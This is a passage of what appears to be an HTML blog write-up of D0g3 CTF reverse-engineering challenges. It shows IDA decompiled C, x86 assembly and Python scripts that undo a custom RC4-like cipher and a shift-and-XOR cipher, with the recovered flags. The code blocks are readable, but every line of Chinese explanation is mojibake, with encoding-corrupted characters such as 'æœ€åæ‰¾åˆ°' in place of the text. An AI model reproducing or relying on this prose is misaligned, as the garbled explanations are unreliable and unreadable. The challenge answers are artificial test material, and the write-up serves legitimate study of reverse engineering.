class="number">22</span>, <span class="number">44</span>, <span class="number">51</span>, <span class="number">37</span>, <span class="number">54</span>, <span class="number">4</span>, <span class="number">56</span>, <span class="number">70</span>, <span class="number">81</span>, <span class="number">60</span>, <span class="number">37</span>, <span class="number">74</span>, <span class="number">19</span>, <span class="number">51</span>, <span class="number">57</span>, <span class="number">59</span>, <span class="number">105</span>, <span class="number">39</span>, <span class="number">77</span>, <span class="number">41</span>, <span class="number">3</span>, <span class="number">20</span>, <span class="number">51</span>, <span class="number">2</span>, <span class="number">48</span>, <span class="number">49</span>, <span class="number">2</span>, <span class="number">64</span>, <span class="number">108</span>]</span><br><span class="line">k = <span class="string">&#x27;&#x27;</span></span><br><span class="line">p = []</span><br><span class="line">inset = [<span class="number">0</span>]*<span class="number">64</span></span><br><span class="line">S = [<span class="number">0</span>]*<span class="number">64</span></span><br><span class="line">key = <span class="built_in">list</span>(<span class="string">&#x27;the_key_&#x27;</span>)</span><br><span class="line"><span class="comment">#åˆå§‹åŒ–</span></span><br><span class="line">a = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">    inset[i] = i</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">    S[i] = <span class="built_in">ord</span>(key[i % <span class="number">8</span>])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">    a = (S[i] + inset[i] + a) % <span class="number">64</span></span><br><span class="line">    inset[i],inset[a] = inset[a],inset[i]</span><br><span class="line"></span><br><span class="line">b = c = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(otherl)):</span><br><span class="line">    b = (b + <span class="number">1</span>) % <span class="number">64</span>;</span><br><span class="line">    c = (inset[b] + c) % <span class="number">64</span></span><br><span class="line">    inset[b],inset[c] = inset[c],inset[b]</span><br><span class="line">    otherl[i] ^= ((c ^ b) &amp; inset[(((c ^ b) + inset[c] + inset[b]) % <span class="number">64</span>)])</span><br><span class="line">    k += <span class="built_in">chr</span>(otherl[i])</span><br><span class="line">    p.append(otherl[i])</span><br><span class="line"><span class="built_in">print</span>(k)</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"><span class="comment">#D0g3&#123;608292C4-15400BA4-B3299A5C-0429D&#125;</span></span><br></pre></td></tr></table></figure><hr><h2 id="ä½ å¥½PE">ä½ å¥½PE</h2><p>idaæ‰“å¼€åæœç´¢å­—ç¬¦ï¼Œæ‰¾ä¸åˆ°ï¼Œ å°è¯•åŠ¨æ€è°ƒè¯•æ‰¾åˆ°ä¸»å‡½æ•°</p><p>æœ€åæ‰¾åˆ°ä¸»å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_1005F820</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *v1; <span class="comment">// [esp+D0h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  sub_1005B16F(&amp;unk_1014000F);</span><br><span class="line">  ((<span class="type">void</span> (__stdcall *)(_DWORD, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>))kernel32_VirtualAlloc)(<span class="number">0</span>, <span class="number">65548</span>, <span class="number">12288</span>, <span class="number">4</span>);</span><br><span class="line">  v1 = (_DWORD *)sub_1005A260();</span><br><span class="line">  <span class="keyword">if</span> ( !v1 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  v1[<span class="number">1</span>] = <span class="number">0x10000</span>;</span><br><span class="line">  *v1 = <span class="number">0</span>;</span><br><span class="line">  v1[<span class="number">2</span>] = v1 + <span class="number">3</span>;</span><br><span class="line">  sub_10059572(v1[<span class="number">2</span>], <span class="number">0</span>, v1[<span class="number">1</span>]);</span><br><span class="line">  sub_10058BC7(<span class="string">&quot;[out]: PLZ Input FLag \n&quot;</span>);</span><br><span class="line">  sub_10058BC7(<span class="string">&quot;[in ]: &quot;</span>);</span><br><span class="line">  sub_100581A4(&amp;unk_10114B68, v1[<span class="number">2</span>]);</span><br><span class="line">  *v1 = sub_1005B5BB(v1[<span class="number">2</span>]);</span><br><span class="line">  <span class="keyword">if</span> ( *v1 == <span class="number">41</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *v1 = <span class="number">48</span>;</span><br><span class="line">    sub_1005A242(v1);</span><br><span class="line">    <span class="keyword">if</span> ( sub_10058AA0(v1[<span class="number">2</span>], &amp;unk_1013C008, <span class="number">48</span>) )</span><br><span class="line">      sub_10058BC7(<span class="string">&quot;[out]: WRONG FLAG\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      sub_10058BC7(<span class="string">&quot;[out]: RIGHT FLAG\n&quot;</span>);</span><br><span class="line">    ((<span class="type">void</span> (__stdcall *)(_DWORD *, _DWORD, <span class="type">int</span>))kernel32_VirtualFree)(v1, <span class="number">0</span>, <span class="number">49152</span>);</span><br><span class="line">    sub_1005A260();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    sub_10058BC7(<span class="string">&quot;[out]: len error\n&quot;</span>);</span><br><span class="line">    ((<span class="type">void</span> (__stdcall *)(_DWORD *, _DWORD, <span class="type">int</span>))kernel32_VirtualFree)(v1, <span class="number">0</span>, <span class="number">49152</span>);</span><br><span class="line">    sub_1005A260();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ‰ä¸¤ä¸ªå‡½æ•°éœ€è¦æ³¨æ„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sub_1005A242(v1);</span><br><span class="line"><span class="keyword">if</span> ( sub_10058AA0(v1[<span class="number">2</span>], &amp;unk_1013C008, <span class="number">48</span>) )</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒä¸ªå‡½æ•°è¿›å»ä¹‹åæ ¹æ®é€»è¾‘åˆ¤æ–­</p><p>å…ˆæ¯”è¾ƒäº†å‰32ä¸ªå€¼ï¼Œç„¶åå¾ˆéº»çƒ¦çš„æ¯”è¾ƒäº†åé¢çš„å€¼ï¼Œåæ­£å°±æ˜¯é‚£ä¸¤ä¸ªå€¼ç›¸ç­‰</p><p>ä¹Ÿå°±æ˜¯è¯´æœ«å€¼å°±æ˜¯unk_1013C008</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0x4D</span>, <span class="number">0xB8</span>, <span class="number">0x76</span>, <span class="number">0x29</span>, <span class="number">0xF5</span>, <span class="number">0xA9</span>, <span class="number">0x9E</span>, <span class="number">0x59</span>, <span class="number">0x55</span>, <span class="number">0x56</span>, <span class="number">0xB1</span>, <span class="number">0xC4</span>, <span class="number">0x2F</span>, <span class="number">0x21</span>, <span class="number">0x2C</span>, <span class="number">0x30</span>, <span class="number">0xB3</span>, <span class="number">0x79</span>, <span class="number">0x78</span>, <span class="number">0x17</span>, <span class="number">0xA8</span>, <span class="number">0xED</span>, <span class="number">0xF7</span>, <span class="number">0xDB</span>, <span class="number">0xE1</span>, <span class="number">0x53</span>, <span class="number">0xF0</span>, <span class="number">0xDB</span>, <span class="number">0xE9</span>, <span class="number">0x03</span>, <span class="number">0x51</span>, <span class="number">0x5E</span>, <span class="number">0x09</span>, <span class="number">0xC1</span>, <span class="number">0x00</span>, <span class="number">0xDF</span>, <span class="number">0xF0</span>, <span class="number">0x96</span>, <span class="number">0xFC</span>, <span class="number">0xC1</span>, <span class="number">0xB5</span>, <span class="number">0xE6</span>, <span class="number">0x62</span>, <span class="number">0x95</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>]</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªåº”è¯¥æ˜¯åŠ å¯†ï¼Œç”¨findcryptæœç´¢ä¸€ä¸‹ï¼Œæœä¸å‡ºæ¥ã€‚ã€‚å¥½åƒåœ¨è°ƒè¯•çš„æ—¶å€™æœä¼šå¾ˆå¡ï¼Œé‚£å°±ç›´æ¥åˆ†æ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">sub_1005F6F0</span><span class="params">(_DWORD *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [esp+D0h] [ebp-30h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+DCh] [ebp-24h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [esp+E8h] [ebp-18h]</span></span><br><span class="line">  <span class="type">int</span> *v5; <span class="comment">// [esp+F8h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  sub_1005B16F(&amp;unk_1014000F);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; *a1 &gt;&gt; <span class="number">3</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = (<span class="type">int</span> *)(a1[<span class="number">2</span>] + <span class="number">8</span> * i);</span><br><span class="line">    v1 = *v5;</span><br><span class="line">    v4 = *(_QWORD *)v5;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">64</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      LOBYTE(v1) = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v4 &lt; <span class="number">0</span> )</span><br><span class="line">        v4 = qword_1013C000 ^ sub_10059F9F(v1, HIDWORD(v4));</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        v4 = sub_10059F9F(v1, HIDWORD(v4));</span><br><span class="line">    &#125;</span><br><span class="line">    *(_QWORD *)v5 = v4;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>~~è¿™å•¥å•Šï¼Œçœ‹ä¸æ‡‚ã€‚ã€‚ã€‚~~æœ€å¤–å±‚å¾ªç¯æ§åˆ¶è½®æ•°ï¼Œå†…å±‚å¾ªç¯æ§åˆ¶ä¸€è½®çš„åŠ å¯†æ¬¡æ•°ï¼Œæ ¹æ®è¿™ä¸ªæ¥ç›´æ¥å†™é€†å‘ï¼Ÿï¼Ÿ</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> __usercall <span class="symbol">sub_1005FDE0@<span class="keyword">&lt;eax&gt;</span></span>(__int64 <span class="symbol">pnum@<span class="keyword">&lt;edx:eax&gt;</span></span>, unsigned __int8 <span class="symbol">ahigh@<span class="keyword">&lt;cl&gt;</span></span>)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( ahigh &gt;= <span class="number">64</span>u )</span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v2) = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( ahigh &gt;= <span class="number">32</span>u )</span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v2) = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> pnum &lt;&lt; (ahigh &amp; <span class="number">0x1F</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™é‡Œä¼¼ä¹sub_10059F9F(v1, HIDWORD(v4))çš„ä½ç½®æœ‰é—®é¢˜ï¼Œæ˜¯idaåç¼–è¯‘çš„é”…ï¼Œåº”è¯¥æ˜¯å…ˆæ‰§è¡Œè¿™ä¸ªå†if else</p><p>çœ‹æ±‡ç¼–çª—å£ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">debug033:1005FDE0 ; int __usercall sub_1005FDE0@&lt;eax&gt;(__int64 pnum@&lt;edx:eax&gt;, unsigned __int8 ahigh@&lt;cl&gt;)</span><br><span class="line">debug033:1005FDE0 sub_1005FDE0    proc near               ; CODE XREF: calâ†‘j</span><br><span class="line">debug033:1005FDE0                 cmp     cl, 40h ; &#x27;@&#x27;</span><br><span class="line">debug033:1005FDE3                 jnb     short loc_1005FDFA</span><br><span class="line">debug033:1005FDE5                 cmp     cl, 20h ; &#x27; &#x27;</span><br><span class="line">debug033:1005FDE8                 jnb     short loc_1005FDF0</span><br><span class="line">debug033:1005FDEA                 shld    edx, eax, cl</span><br><span class="line">debug033:1005FDED                 shl     eax, cl</span><br><span class="line">debug033:1005FDEF                 retn</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov     cl, 1  ;åœ¨è°ƒç”¨calä¹‹å‰</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„clå°±æ˜¯1ï¼Œå’Œä¼ å…¥æ— å…³ï¼Œæœ€åæœ‰ä¸€å¥shl     eax, cl</p><p>shlæ˜¯<code>åŒç²¾åº¦å·¦ç§»</code>ï¼Œè¿™æ˜¯ç±»ä¼¼å¾ªç¯å·¦ç§»çš„æ“ä½œï¼Œå³å·¦ç§»ï¼Œå³è¾¹çš„ç©ºå€¼ç”±å·¦è¾¹æº¢å‡ºçš„å€¼è¡¥å……ï¼Œç±»ä¼¼è¿˜æœ‰shråŒç²¾åº¦å³ç§»ï¼Œå¹¶æ²¡æœ‰0x1f</p><p>å› æ­¤ï¼Œæ•´ä½“é€»è¾‘æ˜¯ï¼š</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">å…ˆåˆ†ç»„ä¸º<span class="number">8</span>å­—èŠ‚<span class="built_in">x6</span>ç»„</span><br><span class="line">å¦‚æœæ˜¯å¥‡æ•°ï¼šä¸keyå†å·¦ç§»</span><br><span class="line">å¦‚æœæ˜¯å¶æ•°ï¼šç›´æ¥å·¦ç§»</span><br><span class="line">å¾—åˆ°ç»“æœ</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥é€†å‘æ˜¯</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">åˆ†ç»„</span><br><span class="line">å¦‚æœæ˜¯å¥‡æ•°ï¼šä¸<span class="built_in">key</span>å†å³ç§»</span><br><span class="line">å¦‚æœæ˜¯å¶æ•°ï¼šç›´æ¥å³ç§»</span><br></pre></td></tr></table></figure><p>åŒæ—¶å¯ä»¥çŸ¥é“çš„æ˜¯ï¼Œ</p><p>å¦‚æœæ˜¯å¥‡æ•°å³ç§»ï¼Œå·¦è¾¹åº”è¯¥è¡¥1</p><p>å¦‚æœæ˜¯å¶æ•°å³ç§»ï¼Œå·¦è¾¹ä¸ç”¨è¡¥</p><p>é‚£ä¹ˆé€†å‘ï¼š</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">last = [<span class="number">0x4D</span>, <span class="number">0xB8</span>, <span class="number">0x76</span>, <span class="number">0x29</span>, <span class="number">0xF5</span>, <span class="number">0xA9</span>, <span class="number">0x9E</span>, <span class="number">0x59</span>, <span class="number">0x55</span>, <span class="number">0x56</span>, <span class="number">0xB1</span>, <span class="number">0xC4</span>, <span class="number">0x2F</span>, <span class="number">0x21</span>, <span class="number">0x2C</span>, <span class="number">0x30</span>, <span class="number">0xB3</span>, <span class="number">0x79</span>, <span class="number">0x78</span>, <span class="number">0x17</span>, <span class="number">0xA8</span>, <span class="number">0xED</span>, <span class="number">0xF7</span>, <span class="number">0xDB</span>, <span class="number">0xE1</span>, <span class="number">0x53</span>, <span class="number">0xF0</span>, <span class="number">0xDB</span>, <span class="number">0xE9</span>, <span class="number">0x03</span>, <span class="number">0x51</span>, <span class="number">0x5E</span>, <span class="number">0x09</span>, <span class="number">0xC1</span>, <span class="number">0x00</span>, <span class="number">0xDF</span>, <span class="number">0xF0</span>, <span class="number">0x96</span>, <span class="number">0xFC</span>, <span class="number">0xC1</span>, <span class="number">0xB5</span>, <span class="number">0xE6</span>, <span class="number">0x62</span>, <span class="number">0x95</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>]</span><br><span class="line"></span><br><span class="line">q = [<span class="number">0x599EA9F52976B84D</span>, <span class="number">0x302C212FC4B15655</span>, <span class="number">0xDBF7EDA8177879B3</span>, <span class="number">0x5E5103E9DBF053E1</span>, <span class="number">0xC1FC96F0DF00C109</span>, <span class="number">0x000000019562E6B5</span>]</span><br><span class="line">key = <span class="number">0x54AA4A9</span></span><br><span class="line">k=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">        <span class="keyword">if</span> (q[i] &amp; <span class="number">1</span>):</span><br><span class="line">            q[i] = (q[i] ^ key) &gt;&gt; <span class="number">1</span></span><br><span class="line">            q[i] |= <span class="number">0x8000000000000000</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            q[i] = (q[i] &gt;&gt; <span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    k.append(<span class="built_in">hex</span>(q[i]))</span><br><span class="line"><span class="built_in">print</span>(k)</span><br><span class="line"><span class="comment">#[&#x27;0x4530367b33673044&#x27;, &#x27;0x37352d4132374531&#x27;, &#x27;0x372d304642384136&#x27;, &#x27;0x2d39424243313037&#x27;, &#x27;0x4345353134323042&#x27;, &#x27;0x7d&#x27;]</span></span><br></pre></td></tr></table></figure><p>é€†åºï¼Œè½¬hexï¼ŒæŒ‰å­—ç¬¦é€†åº</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">D0g3</span>&#123;<span class="number">60</span>E1E72A-<span class="number">576</span>A8BF0-<span class="number">7701</span>CBB9-B02415EC&#125;</span><br></pre></td></tr></table></figure><h2 id="ä½ è§è¿‡è“è‰²çš„å°é²¸é±¼å—">ä½ è§è¿‡è“è‰²çš„å°é²¸é±¼å—</h2><p>æ‰“å¼€æ–‡ä»¶åï¼Œå‘ç°æ˜¯winç¨‹åºï¼Œè¯´æ˜è¿›å…¥ä¸»çª—å£ç¨‹åºå’Œåˆ¤æ–­å‡½æ•°ä¸ä¸€å®šåœ¨ä¸€ä¸ªä½ç½®</p><p>æ‰€ä»¥æ‰“å¼€åéœ€è¦æ‰¾åˆ°åˆ¤æ–­ä»£ç ï¼Œæœç´¢stringæ— æ•ˆ</p><p>æ ¹æ®å¼¹çª—å‡½æ•°æ˜¯MessageBoxï¼Œå°è¯•æœç´¢</p><p>ç„¶åæ‰¾åˆ°åˆ¤æ–­å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __thiscall <span class="title function_">lastcall</span><span class="params">(<span class="type">void</span> *this)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> wrong[<span class="number">28</span>]; <span class="comment">// [esp+D0h] [ebp-54h] BYREF</span></span><br><span class="line">  CHAR yes[<span class="number">20</span>]; <span class="comment">// [esp+ECh] [ebp-38h] BYREF</span></span><br><span class="line">  CHAR Caption[<span class="number">24</span>]; <span class="comment">// [esp+100h] [ebp-24h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *v5; <span class="comment">// [esp+118h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = this;</span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_52102F);</span><br><span class="line">  <span class="built_in">strcpy</span>(Caption, <span class="string">&quot;tip&quot;</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(yes, <span class="string">&quot;You Get It!&quot;</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(wrong, <span class="string">&quot;Wrong user/passwd&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *((_DWORD *)v5 + <span class="number">2</span>) != *((_DWORD *)v5 + <span class="number">3</span>)</span><br><span class="line">    || j__memcmp(*(<span class="type">const</span> <span class="type">void</span> **)v5, *((<span class="type">const</span> <span class="type">void</span> **)v5 + <span class="number">1</span>), *((_DWORD *)v5 + <span class="number">3</span>)) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> MessageBoxA(<span class="number">0</span>, wrong, Caption, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> MessageBoxA(<span class="number">0</span>, yes, Caption, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„v5+2å’Œv5+3ä¸€å®šæŒ‡å‘ä¸€ä¸ªæ˜¯è¾“å…¥ï¼ˆå¯èƒ½åŠ å¯†äº†ï¼‰ï¼Œå¦ä¸€ä¸ªè¯´ä¸å‡†ï¼Œå› ä¸ºæœ‰ä¸€ä¸ªå¯†ç ä¸€ä¸ªç”¨æˆ·å</p><p>ç”±äºéœ€è¦è¿›å…¥elseåˆ†æ”¯ï¼Œæ‰€ä»¥æ¡ä»¶å¿…é¡»ä¸ºå‡</p><p>å³ï¼š</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*((_DWORD *)v5 + <span class="number">2</span>) == *((_DWORD *)v5 + <span class="number">3</span>)</span><br><span class="line">    &amp;&amp; ï¼j__memcmp<span class="comment">(*(const void **)</span>v5, *((<span class="keyword">const</span> void **)v5 + <span class="number">1</span>), *((_DWORD *)v5 + <span class="number">3</span>))</span><br></pre></td></tr></table></figure><p>æ—¢ç„¶å¦‚æ­¤ï¼Œéœ€è¦æ‰¾å‡ºèƒ½æ”¹å˜v5+2å’Œ+3çš„åœ°å€çš„å‡½æ•°ï¼ˆä¿®æ”¹äº†thisï¼‰ï¼Œå‘ä¸Šæ‰¾ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">void</span> *v4; <span class="comment">// [esp+10h] [ebp-154h]</span></span><br><span class="line">  <span class="type">void</span> *v5; <span class="comment">// [esp+24h] [ebp-140h]</span></span><br><span class="line">  CHAR *v6; <span class="comment">// [esp+114h] [ebp-50h]</span></span><br><span class="line">  CHAR *lpString; <span class="comment">// [esp+120h] [ebp-44h]</span></span><br><span class="line">  HWND DlgItem; <span class="comment">// [esp+12Ch] [ebp-38h]</span></span><br><span class="line">  HWND hWnd; <span class="comment">// [esp+138h] [ebp-2Ch]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [esp+144h] [ebp-20h]</span></span><br><span class="line">  <span class="type">int</span> WindowTextLengthA; <span class="comment">// [esp+150h] [ebp-14h]</span></span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_52105E);</span><br><span class="line">  hWnd = GetDlgItem((HWND)argc, <span class="number">1003</span>);</span><br><span class="line">  DlgItem = GetDlgItem((HWND)argc, <span class="number">1004</span>);</span><br><span class="line">  WindowTextLengthA = GetWindowTextLengthA(hWnd);</span><br><span class="line">  v10 = GetWindowTextLengthA(DlgItem);</span><br><span class="line">  lpString = (CHAR *)j__malloc(__CFADD__(WindowTextLengthA, <span class="number">16</span>) ? <span class="number">-1</span> : WindowTextLengthA + <span class="number">16</span>);</span><br><span class="line">  result = (<span class="type">int</span>)j__malloc(__CFADD__(v10, <span class="number">16</span>) ? <span class="number">-1</span> : v10 + <span class="number">16</span>);</span><br><span class="line">  v6 = (CHAR *)result;</span><br><span class="line">  <span class="keyword">if</span> ( lpString &amp;&amp; result )</span><br><span class="line">  &#123;</span><br><span class="line">    GetWindowTextA(hWnd, lpString, WindowTextLengthA + <span class="number">16</span>);</span><br><span class="line">    GetWindowTextA(DlgItem, v6, v10 + <span class="number">16</span>);</span><br><span class="line">    v5 = operator new(<span class="number">0x10</span>u);</span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_451B43(<span class="number">0x10</span>u);</span><br><span class="line">      v4 = (<span class="type">void</span> *)sub_450CE3(v5);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v4 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    sub_44FC2B(&amp;unk_51D38C, 